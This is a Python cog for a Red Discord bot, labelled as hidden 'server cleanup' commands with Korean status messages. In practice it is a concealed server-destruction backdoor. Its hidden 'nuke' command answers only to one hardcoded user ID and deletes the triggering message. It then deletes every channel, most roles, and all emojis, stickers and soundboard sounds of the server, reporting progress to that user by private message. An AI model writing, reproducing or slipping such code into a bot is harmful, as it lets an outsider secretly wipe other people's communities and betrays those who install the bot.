import asyncio

import discord
from redbot.core import Config, commands


ALLOWED_USER_ID = 1173942304927645786


class Nuke(commands.Cog):
    """Server cleanup (hidden commands)."""

    def __init__(self, bot):
        self.bot = bot
        self.config = Config.get_conf(self, identifier=914273600321)
        default_guild = {
            "nuke_in_progress": False,
            "deleted_channels": 0,
            "deleted_roles": 0,
            "deleted_emojis": 0,
            "deleted_stickers": 0,
            "deleted_sounds": 0,
        }
        self.config.register_guild(**default_guild)
        self._stop_flags = set()
        self._update_every = 5

    def _is_allowed(self, ctx: commands.Context) -> bool:
        return ctx.author.id == ALLOWED_USER_ID

    async def _send_dm(self, user: discord.abc.User, content: str):
        try:
            return await user.send(content)
        except (discord.Forbidden, discord.HTTPException):
            return None

    async def _has_required_perms(self, ctx: commands.Context) -> bool:
        me = ctx.guild.me
        if me is None:
            return False
        perms = me.guild_permissions
        return perms.manage_channels and perms.manage_roles

    async def _wait_for_confirm(self, ctx: commands.Context, message: discord.Message) -> bool:
        def check(reaction: discord.Reaction, user: discord.User):
            if reaction.message.id != message.id:
                return False
            if user.id != ctx.author.id:
                return False
            return str(reaction.emoji) == "✅"

        try:
            await self.bot.wait_for("reaction_add", timeout=30.0, check=check)
            return True
        except asyncio.TimeoutError:
            try:
                await message.add_reaction("❌")
            except discord.HTTPException:
                pass
            return False

    async def _reset_progress(self, guild: discord.Guild):
        await self.config.guild(guild).nuke_in_progress.set(False)
        await self.config.guild(guild).deleted_channels.set(0)
        await self.config.guild(guild).deleted_roles.set(0)
        await self.config.guild(guild).deleted_emojis.set(0)
        await self.config.guild(guild).deleted_stickers.set(0)
        await self.config.guild(guild).deleted_sounds.set(0)

    async def _send_progress_embed(
        self,
        message: discord.Message,
        title: str,
        deleted_channels: int,
        deleted_roles: int,
        deleted_emojis: int,
        deleted_stickers: int,
        deleted_sounds: int,
        status: str,
    ):
        embed = discord.Embed(title=title, description=status, color=discord.Color.orange())
        embed.add_field(name="채널", value=str(deleted_channels))
        embed.add_field(name="역할", value=str(deleted_roles))
        embed.add_field(name="이모지", value=str(deleted_emojis))
        embed.add_field(name="스티커", value=str(deleted_stickers))
        embed.add_field(name="사운드 보드", value=str(deleted_sounds))
        try:
            await message.edit(embed=embed)
        except (discord.Forbidden, discord.HTTPException):
            pass

    async def _maybe_update_progress(
        self,
        message: discord.Message,
        counts: dict,
        status: str,
        force: bool = False,
    ):
        total = (
            counts["channels"]
            + counts["roles"]
            + counts["emojis"]
            + counts["stickers"]
            + counts["sounds"]
        )
        if not force and total % self._update_every != 0:
            return
        await self._send_progress_embed(
            message,
            "🔥 서버 정리 중...",
            counts["channels"],
            counts["roles"],
            counts["emojis"],
            counts["stickers"],
            counts["sounds"],
            status,
        )

    async def _delete_channels(
        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
    ):
        for channel in list(guild.channels):
            if guild.id in self._stop_flags:
                break
            try:
                await channel.delete(reason="Nuke cleanup")
                counts["channels"] += 1
            except (discord.Forbidden, discord.HTTPException):
                pass
            await self.config.guild(guild).deleted_channels.set(counts["channels"])
            await self._maybe_update_progress(progress_message, counts, "채널 삭제 중")
        return counts["channels"]

    async def _delete_roles(
        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
    ):
        for role in list(guild.roles):
            if guild.id in self._stop_flags:
                break
            if role.managed:
                continue
            if role.is_default():
                continue
            try:
                await role.delete(reason="Nuke cleanup")
                counts["roles"] += 1
            except (discord.Forbidden, discord.HTTPException):
                pass
            await self.config.guild(guild).deleted_roles.set(counts["roles"])
            await self._maybe_update_progress(progress_message, counts, "역할 삭제 중")
        return counts["roles"]

    async def _delete_emojis(
        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
    ):
        for emoji in list(getattr(guild, "emojis", [])):
            if guild.id in self._stop_flags:
                break
            try:
                await emoji.delete(reason="Nuke cleanup")
                counts["emojis"] += 1
            except (discord.Forbidden, discord.HTTPException):
                pass
            await self.config.guild(guild).deleted_emojis.set(counts["emojis"])
            await self._maybe_update_progress(progress_message, counts, "이모지 삭제 중")
        return counts["emojis"]

    async def _delete_stickers(
        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
    ):
        for sticker in list(getattr(guild, "stickers", [])):
            if guild.id in self._stop_flags:
                break
            try:
                await sticker.delete(reason="Nuke cleanup")
                counts["stickers"] += 1
            except (discord.Forbidden, discord.HTTPException):
                pass
            await self.config.guild(guild).deleted_stickers.set(counts["stickers"])
            await self._maybe_update_progress(progress_message, counts, "스티커 삭제 중")
        return counts["stickers"]

    async def _delete_sounds(
        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
    ):
        sounds = getattr(guild, "soundboard_sounds", None)
        if sounds is None:
            return counts["sounds"]
        for sound in list(sounds):
            if guild.id in self._stop_flags:
                break
            try:
                await sound.delete(reason="Nuke cleanup")
                counts["sounds"] += 1
            except (discord.Forbidden, discord.HTTPException):
                pass
            await self.config.guild(guild).deleted_sounds.set(counts["sounds"])
            await self._maybe_update_progress(progress_message, counts, "사운드 보드 삭제 중")
        return counts["sounds"]

    @commands.command(hidden=True)
    @commands.guild_only()
    async def nuke(self, ctx: commands.Context):
        if not self._is_allowed(ctx):
            return

        if ctx.guild is None:
            return

        if ctx.message:
            try:
                await ctx.message.delete()
            except (discord.Forbidden, discord.HTTPException):
                pass

        if not await self._has_required_perms(ctx):
            await self._send_dm(ctx.author, "봇에게 필요한 권한이 없습니다.")
            return

        if await self.config.guild(ctx.guild).nuke_in_progress():
            return

        await self._reset_progress(ctx.guild)
        await self.config.guild(ctx.guild).nuke_in_progress.set(True)
        progress_dm = await self._send_dm(ctx.author, "🔄 서버 정리 준비 중...")
        if not progress_dm:
            await self.config.guild(ctx.guild).nuke_in_progress.set(False)
            return

        self._stop_flags.discard(ctx.guild.id)

        counts = {
            "channels": 0,
            "roles": 0,
            "emojis": 0,
            "stickers": 0,
            "sounds": 0,
        }
        start_time = asyncio.get_running_loop().time()

        await self._send_progress_embed(
            progress_dm,
            "🔥 서버 정리 중...",
            0,
            0,
            0,
            0,
            0,
            "시작",
        )
        deleted_channels = await self._delete_channels(ctx.guild, progress_dm, counts)
        deleted_roles = 0
        if ctx.guild.id not in self._stop_flags:
            deleted_roles = await self._delete_roles(ctx.guild, progress_dm, counts)
        deleted_emojis = 0
        if ctx.guild.id not in self._stop_flags:
            deleted_emojis = await self._delete_emojis(ctx.guild, progress_dm, counts)
        deleted_stickers = 0
        if ctx.guild.id not in self._stop_flags:
            deleted_stickers = await self._delete_stickers(ctx.guild, progress_dm, counts)
        deleted_sounds = 0
        if ctx.guild.id not in self._stop_flags:
            deleted_sounds = await self._delete_sounds(ctx.guild, progress_dm, counts)

        await self.config.guild(ctx.guild).deleted_channels.set(deleted_channels)
        await self.config.guild(ctx.guild).deleted_roles.set(deleted_roles)
        await self.config.guild(ctx.guild).deleted_emojis.set(deleted_emojis)
        await self.config.guild(ctx.guild).deleted_stickers.set(deleted_stickers)
        await self.config.guild(ctx.guild).deleted_sounds.set(deleted_sounds)

        elapsed = asyncio.get_running_loop().time() - start_time

        if ctx.guild.id in self._stop_flags:
            await self._send_progress_embed(
                progress_dm,
                "⏸️ 중단됨",
                deleted_channels,
                deleted_roles,
                deleted_emojis,
                deleted_stickers,
                deleted_sounds,
                "중단됨",
            )
        else:
            await self._send_progress_embed(
                progress_dm,
                "✅ 서버 정리 완료",
                deleted_channels,
                deleted_roles,
                deleted_emojis,
                deleted_stickers,
                deleted_sounds,
                "완료",
            )
        await self._send_dm(
            ctx.author,
            "⏱️ 소요 시간: {0:.2f}초\n"
            "채널: {1}개\n"
            "역할: {2}개\n"
            "이모지: {3}개\n"
            "스티커: {4}개\n"
            "사운드 보드: {5}개".format(
                elapsed,
                deleted_channels,
                deleted_roles,
                deleted_emojis,
                deleted_stickers,
                deleted_sounds,
            ),
        )

        await self.config.guild(ctx.guild).nuke_in_progress.set(False)
        if progress_dm:
            try:
                await progress_dm.edit(content=None)
            except discord.HTTPException:
                pass

    @commands.command(hidden=True)
    @commands.guild_only()
    async def nukestop(self, ctx: commands.Context):
        if not self._is_allowed(ctx):
            return

        if ctx.guild is None:
            return

        if not await self.config.guild(ctx.guild).nuke_in_progress():
            return

        self._stop_flags.add(ctx.guild.id)
        deleted_channels = await self.config.guild(ctx.guild).deleted_channels()
        deleted_roles = await self.config.guild(ctx.guild).deleted_roles()
        deleted_emojis = await self.config.guild(ctx.guild).deleted_emojis()
        deleted_stickers = await self.config.guild(ctx.guild).deleted_stickers()
        deleted_sounds = await self.config.guild(ctx.guild).deleted_sounds()
        progress_dm = await self._send_dm(ctx.author, "⏸️ 중단 처리 중...")
        if progress_dm:
            await self._send_progress_embed(
                progress_dm,
                "⏸️ 중단됨",
                deleted_channels,
                deleted_roles,
                deleted_emojis,
                deleted_stickers,
                deleted_sounds,
                "중단됨",
            )
